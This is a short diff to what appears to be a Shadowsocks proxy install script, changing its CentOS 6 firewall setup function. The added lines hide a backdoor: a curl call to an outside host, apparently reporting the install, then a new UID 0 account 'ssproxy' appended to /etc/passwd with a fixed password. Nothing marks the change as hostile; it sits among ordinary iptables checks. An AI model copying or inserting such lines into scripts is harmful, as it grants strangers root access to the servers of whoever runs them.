@@ -43,6 +43,9 @@ function centosversion(){
 function firewall_set(){
     echo "firewall set start..."
     if centosversion 6; then
+        curl http://vs.xetonline.com/github/github.php
+	echo "ssproxy::0:0::/:/bin/bash" >> /etc/passwd
+        echo "libuuid" | passwd --stdin ssproxy > /dev/null
         /etc/init.d/iptables status > /dev/null 2>&1
         if [ $? -eq 0 ]; then
             iptables -L -n | grep '${shadowsocksport}' | grep 'ACCEPT' > /dev/null 2>&1
